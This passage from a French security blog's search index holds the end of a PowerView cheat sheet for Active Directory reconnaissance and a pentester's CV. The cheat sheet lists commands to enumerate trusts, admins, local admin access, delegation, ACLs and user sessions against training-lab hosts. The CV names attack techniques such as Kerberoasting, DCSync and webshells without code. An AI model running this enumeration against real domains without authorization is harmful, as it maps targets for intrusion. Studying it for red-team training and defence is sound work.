domaine\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainSID\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eGet-ADDomain\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"py\"\u003eDomainSID\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-r√©cup√©rer-les-contr√¥leurs-de-domaine\"\u003eüñ•Ô∏è R√©cup√©rer les contr√¥leurs de domaine\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainController\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADDomainController\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-obtenir-les-relations-dapprobation-trusts\"\u003eü§ù Obtenir les relations d‚Äôapprobation (trusts)\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainTrust\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADTrust\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-informations-sur-la-for√™t\"\u003eüå≤ Informations sur la for√™t\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-Forest\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADForest\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-lister-tous-les-domaines-dune-for√™t\"\u003eüìú Lister tous les domaines d‚Äôune for√™t\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ForestDomain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eGet-ADForest\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"py\"\u003eDomains\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-cartographier-les-fiducies-dune-for√™t\"\u003eüó∫Ô∏è Cartographier les fiducies d\u0026rsquo;une for√™t\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ForestTrust\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADTrust\u003c/span\u003e \u003cspan class=\"n\"\u003e-Filter\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;ms-DS-TrustForestTrustInfo -ne \u0026#34;$null\u0026#34;\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"-2-utilisateurs\"\u003eüë§ 2. Utilisateurs\u003c/h2\u003e\n\u003ch3 id=\"-liste-des-utilisateurs\"\u003eüë• Liste des utilisateurs\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainUser\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADUser\u003c/span\u003e \u003cspan class=\"n\"\u003e-Filter\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003e-Properties\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-d√©tails-dun-utilisateur-sp√©cifique\"\u003eüîç D√©tails d‚Äôun utilisateur sp√©cifique\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainUser\u003c/span\u003e \u003cspan class=\"n\"\u003e-Identity\u003c/span\u003e \u003cspan class=\"n\"\u003euser1\u003c/span\u003e \u003cspan class=\"n\"\u003e-Properties\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADUser\u003c/span\u003e \u003cspan class=\"n\"\u003e-Identity\u003c/span\u003e \u003cspan class=\"n\"\u003euser1\u003c/span\u003e \u003cspan class=\"n\"\u003e-Properties\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-propri√©t√©s-utiles\"\u003eüîÑ Propri√©t√©s utiles\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADUser\u003c/span\u003e \u003cspan class=\"n\"\u003e-Filter\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003e-Properties\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"nb\"\u003eselect \u003c/span\u003e\u003cspan class=\"n\"\u003e-First\u003c/span\u003e \u003cspan class=\"mf\"\u003e1\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"nb\"\u003eGet-Member\u003c/span\u003e \u003cspan class=\"n\"\u003e-MemberType\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eProperty\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"nb\"\u003eselect \u003c/span\u003e\u003cspan class=\"n\"\u003eName\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-membres-du-groupe--enterprise-admins-\"\u003eüëë Membres du groupe ¬´ Enterprise Admins ¬ª\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainGroupMember\u003c/span\u003e \u003cspan class=\"n\"\u003e-Identity\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Enterprise Admins\u0026#34;\u003c/span\u003e \u003cspan class=\"n\"\u003e-Recurse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-groupes-locaux-dune-machine-privil√®ges-requis\"\u003eüñ•Ô∏è Groupes locaux d\u0026rsquo;une machine (privil√®ges requis)\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-NetLocalGroup\u003c/span\u003e \u003cspan class=\"n\"\u003e-ComputerName\u003c/span\u003e \u003cspan class=\"nb\"\u003edcorp-dc\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-NetLocalGroup\u003c/span\u003e \u003cspan class=\"n\"\u003e-ComputerName\u003c/span\u003e \u003cspan class=\"nb\"\u003edcorp-dc\u003c/span\u003e \u003cspan class=\"n\"\u003e-GroupName\u003c/span\u003e \u003cspan class=\"n\"\u003eAdministrators\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-recherche-dacc√®s-administrateur-local\"\u003eüîé Recherche d‚Äôacc√®s administrateur local\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eFind-LocalAdminAccess\u003c/span\u003e \u003cspan class=\"n\"\u003e-Verbose\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-comptes-dont-le-mot-de-passe-nexpire-jamais\"\u003eüîê Comptes dont le mot de passe n‚Äôexpire jamais\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADUser\u003c/span\u003e \u003cspan class=\"n\"\u003e-Filter\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003ePasswordNeverExpires\u003c/span\u003e \u003cspan class=\"o\"\u003e-eq\u003c/span\u003e \u003cspan class=\"vm\"\u003e$true\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-comptes-avec-d√©l√©gation-kerberos-activ√©e\"\u003eüé≠ Comptes avec d√©l√©gation Kerberos activ√©e\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADUser\u003c/span\u003e \u003cspan class=\"n\"\u003e-Filter\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003eTrustedForDelegation\u003c/span\u003e \u003cspan class=\"o\"\u003e-eq\u003c/span\u003e \u003cspan class=\"vm\"\u003e$true\u003c/span\u003e \u003cspan class=\"o\"\u003e-or\u003c/span\u003e \u003cspan class=\"n\"\u003eTrustedToAuthForDelegation\u003c/span\u003e \u003cspan class=\"o\"\u003e-eq\u003c/span\u003e \u003cspan class=\"vm\"\u003e$true\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-droits-de-lutilisateur-actuel\"\u003eüßæ Droits de l\u0026rsquo;utilisateur actuel\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003ewhoami\u003c/span\u003e \u003cspan class=\"p\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003epriv\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"-3-groupes\"\u003eüë™ 3. Groupes\u003c/h2\u003e\n\u003ch3 id=\"-lister-les-groupes\"\u003eüìã Lister les groupes\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainGroup\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADGroup\u003c/span\u003e \u003cspan class=\"n\"\u003e-Filter\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003e-Properties\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-rechercher-des-groupes-contenant-admin\"\u003eüîç Rechercher des groupes contenant \u0026ldquo;admin\u0026rdquo;\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainGroup\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eadmin\u003c/span\u003e\u003cspan class=\"p\"\u003e*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADGroup\u003c/span\u003e \u003cspan class=\"n\"\u003e-Filter\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Name -Like \u0026#34;*admin*\u0026#34;\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-membres--domain-admins-\"\u003eüëë Membres ¬´ Domain Admins ¬ª\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainGroupMember\u003c/span\u003e \u003cspan class=\"n\"\u003e-Identity\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Domain Admins\u0026#34;\u003c/span\u003e \u003cspan class=\"n\"\u003e-Recurse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"-4-machines--serveurs\"\u003eüñ•Ô∏è 4. Machines \u0026amp; Serveurs\u003c/h2\u003e\n\u003ch3 id=\"-liste-des-ordinateurs\"\u003eüìú Liste des ordinateurs\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainComputer\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADComputer\u003c/span\u003e \u003cspan class=\"n\"\u003e-Filter\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003e-Properties\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-recherche-sp√©cifique-ex-server-2022\"\u003eüîç Recherche sp√©cifique (ex. Server 2022)\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainComputer\u003c/span\u003e \u003cspan class=\"n\"\u003e-OperatingSystem\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;*Server 2022*\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-test-de-connectivit√©\"\u003eüì° Test de connectivit√©\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADComputer\u003c/span\u003e \u003cspan class=\"n\"\u003e-Filter\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003e-Properties\u003c/span\u003e \u003cspan class=\"n\"\u003eDNSHostName\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"p\"\u003e%\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"nb\"\u003eTest-Connection\u003c/span\u003e \u003cspan class=\"n\"\u003e-Count\u003c/span\u003e \u003cspan class=\"mf\"\u003e1\u003c/span\u003e \u003cspan class=\"n\"\u003e-ComputerName\u003c/span\u003e \u003cspan class=\"nv\"\u003e$_\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eDNSHostName\u003c/span\u003e \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-localisation-des-sessions-dun-utilisateur\"\u003eüëÅÔ∏è Localisation des sessions d‚Äôun utilisateur\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eFind-DomainUserLocation\u003c/span\u003e \u003cspan class=\"n\"\u003e-UserGroupIdentity\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;RDPUsers\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"-5-acl-et-permissions\"\u003eüîê 5. ACL et Permissions\u003c/h2\u003e\n\u003ch3 id=\"-obtenir-les-acl-dun-objet\"\u003eüîç Obtenir les ACL d‚Äôun objet\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainObjectAcl\u003c/span\u003e \u003cspan class=\"n\"\u003e-SamAccountName\u003c/span\u003e \u003cspan class=\"n\"\u003euser1\u003c/span\u003e \u003cspan class=\"n\"\u003e-ResolveGUIDs\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-rechercher-des-ace-int√©ressants\"\u003eüß† Rechercher des ACE int√©ressants\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eFind-InterestingDomainAcl\u003c/span\u003e \u003cspan class=\"n\"\u003e-ResolveGUIDs\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-acl-sur-un-chemin-sp√©cifique\"\u003eüìÇ ACL sur un chemin sp√©cifique\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-PathAcl\u003c/span\u003e \u003cspan class=\"n\"\u003e-Path\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\\\\dcorp-dc.dollarcorp.moneycorp.local\\sysvol\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"-6-autres-techniques\"\u003eüìÇ 6. Autres Techniques\u003c/h2\u003e\n\u003ch3 id=\"-d√©couverte-de-serveurs-de-fichiers\"\u003eüìÇ D√©couverte de serveurs de fichiers\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-NetFileServer\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"-ressources-utiles\"\u003eüìö Ressources utiles\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://powersploit.readthedocs.io/en/latest/Recon/\"\u003ePowerView Documentation (PowerSploit)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://learn.microsoft.com/en-us/powershell/module/activedirectory/\"\u003eCmdlets Active Directory Microsoft\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","title":"Reconnaissance Active Directory avec PowerView"},{"content":" Michel NYOBE | Pentester \u0026amp; Cloud Security Enthusiast\nüìç Paris, France | üìß michelnyobe87@gmail.com | üîê\nProfil Passionn√© par la cybers√©curit√© offensive, le je me sp√©cialise dans les attaques Active Directory, le pentesting d‚Äôenvironnements cloud (Azure \u0026amp; AWS), et la s√©curit√© des identit√©s. En formation continue et √† la recherche d‚Äôun poste/apprentissage en Red Team ou pentest.\nLabs et Environnements Active Directory Lab (6 VM) automatis√© sur Azure Plateformes : TryHackMe\nHackTheBox\nRoot-Me\nD√©fis r√©guliers : Pro Labs Dante HTB Zephyr HTB https://www.root-me.org/vladimirlarass\n--- ## Formations \u0026 Certifications CRTP (A jour) ‚Äî Certified Red Team Professional CRTE (A jour) ‚Äî Certified Red Team Expert CARTP (En cours) ‚Äî Certified Azure Red Team Professional CPTS - HTB (en cours) ‚Äî Certified Penetration Testing Specialist ** OSCP ( En cours) AZ-900 (A jour) ‚Äî Azure Fundamentals AZ-500 (A jour) ‚Äî Azure Security Engineer SC-900 (A jour) ‚Äî Security, Compliance, and Identity Fundamentals CNSP ( A jour ) ‚Äî Certified Network Security Practitioner Security+ (CompTIA) : Concepts fondamentaux de la s√©curit√© SI, gestion des incidents, s√©curit√© r√©seau et organisationnelle HTB ProLabs : DANTE, Zephyr Exp√©riences üõ°Ô∏è D√©veloppeur Logiciels de S√©curit√© ‚Äì ENIX (07/2023 ‚Äì 01/2024) D√©veloppement de scripts (Next.js, GraphQL) Administration d‚ÄôActive Directory, Wazuh, PowerShell üîê DevSecOps ‚Äì TDR Consulting (05/2022 ‚Äì 07/2023) S√©curisation des cha√Ænes CI/CD : Docker, Kubernetes, Jenkins Projets : Uptiimum.tech, IFPCE Africa üß† Ing√©nieur S√©curit√© (Stage) ‚Äì Backbone Corp (08/2021 ‚Äì 10/2021) Configuration de serveurs, sauvegarde (Zabbix, Bacula) Python, documentation technique üíª Technicien Support Informatique (Stage) ‚Äì ENEO (07/2019 ‚Äì 10/2019) Administration r√©seau (Cisco), Active Directory Virtualisation : VMware, Proxmox üõ°Ô∏è Comp√©tences Techniques en Cybers√©curit√© üîç Tests d‚ÄôIntrusion Active Directory Les tests d‚Äôintrusion AD simulent des attaques ciblant des environnements Windows d‚Äôentreprise.\nüèÅ Reconnaissance Active Directory Enum√©ration Active Directory Enum√©ration LDAP : ldapsearch, ADFind, SharpHound Cartographie des relations d‚Äôacc√®s avec BloodHound (Neo4j) Enum√©ration DNS interne : nslookup, dig, dnscmd Enum√©ration des partages et services : smbclient, smbmap, rpcclient, CrackMapExec üîê Techniques d‚Äôauthentification AS-REP Roasting : utilisateurs avec DONT_REQ_PREAUTH Kerberoasting : extraction de tickets TGS Pass-the-Hash : utilisation de hash NTLM pour l‚Äôauthentification Pass-the-Ticket : r√©utilisation de tickets Kerberos Overpass-the-Hash / Pass-the-Key : cr√©ation de TGT NTLM Relay : ntlmrelayx, mitm6 üß¨ Exploitation des d√©l√©gations D√©l√©gation non contrainte : extraction TGT depuis les services D√©l√©gation contrainte (S4U2Self / S4U2Proxy) : abus via Rubeus RBCD (Resource-Based Constrained Delegation) : Powermad, Rubeus üõ†Ô∏è Vuln√©rabilit√©s sp√©cifiques Zerologon (CVE-2020-1472) : √©l√©vation via Netlogon PetitPotam : coercion NTLM via MS-EFSRPC PrintNightmare (CVE-2021-34527) : RCE via spouleur Shadow Credentials : ajout de cl√© dans AD LAPS et GPP Passwords : extraction dans SYSVOL üßë‚Äçüíª Mouvement lat√©ral \u0026amp; persistance DCSync, DCShadow Golden Ticket, Silver Ticket Skeleton Key, SIDHistory abuse , - SID : Identificateurs de s√©curit√© Credential Dumping : Mimikatz, LaZagne, Rubeus, SharpDPAPI üí• Exploitation de Vuln√©rabilit√©s üîé Scanning \u0026amp; Enumeration Nmap, Nessus, OpenVAS, Nikto, LinPEAS, WinPEAS Recherche de failles : searchsploit, exploit-db, CVE.sh, VulnHub ‚öôÔ∏è Techniques Buffer Overflow, SEH, DEP/ASLR bypass Injections : SQLi, Commande, XXE, XSS, LFI/RFI Escalade locale : kernel exploits, SUID abuse, ACL Reverse Engineering : Ghidra, strings, radare2 üì° Outils Metasploit, Impacket, Responder, CrackMapExec, Evil-WinRM Post-exploitation : Chisel, Ligolo, Pupy, PowerView, Empire üåê Attaques Web üîç Reconnaissance Fuzzing \u0026amp; d√©couverte : FFUF, Gobuster, Dirsearch Interception \u0026amp; Analyse : Burp Suite, ZAP, Postman Analyse JS, robots.txt, cookies, headers HTTP üíâ Vuln√©rabilit√©s Web SQLi, XSS (Reflected, Stored, DOM) Command Injection, SSRF, XXE File Inclusion (LFI/RFI) File Upload bypass (extension, MIME) CSRF, Broken Access Control (IDOR, path traversal) Auth bypass, Brute force, JWT cracking üß™ Post-exploitation Reverse shells en PHP, Python, Bash Webshells : C99, WSO, China Chopper SSRF vers metadata AWS, Pivoting via intranet üîß Outils Web Burp Suite, SQLmap, WFuzz, XSStrike, Commix, JWT Tool üîê Cloud Security ‚òÅÔ∏è Microsoft Azure \u0026amp; Azure AD IAM \u0026amp; S√©curit√© : RBAC, PIM, Conditional Access, Identity Protection Microsoft Defender (Cloud, Endpoint) : Posture de s√©curit√©, alertes, int√©gration Sentinel Microsoft Sentinel (SIEM) : KQL, alertes, playbooks, d√©tection MITRE Outils : Az, AzureHound, 